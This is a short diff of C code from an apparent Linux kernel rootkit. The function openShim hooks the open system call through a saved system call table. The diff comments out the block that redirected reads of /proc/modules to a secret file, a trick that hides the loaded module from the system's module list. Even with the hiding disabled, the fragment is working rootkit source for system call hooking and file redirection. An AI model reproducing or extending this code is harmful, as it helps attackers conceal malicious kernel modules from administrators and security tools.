@@ -25,14 +25,14 @@ int openShim(char *filename, int flags, umode_t mode) {
 	}
 
 	//redirect /proc/modules
-	if (!strcmp(filename, "/proc/modules")) {
+	/*if (!strcmp(filename, "/proc/modules")) {
 		printk(KERN_INFO "Redirecting /proc/modules open\n");
 		old_fs = get_fs();
 		set_fs(KERNEL_DS);
 		ret = ((SYS_open_type)backup_sys_call_table[SYS_open])(secret_procmods_name, flags, mode);
 		set_fs(old_fs);
 		return ret;
-	}
+	}*/
 
 	return ((SYS_open_type)backup_sys_call_table[SYS_open])(filename, flags, mode);
 }
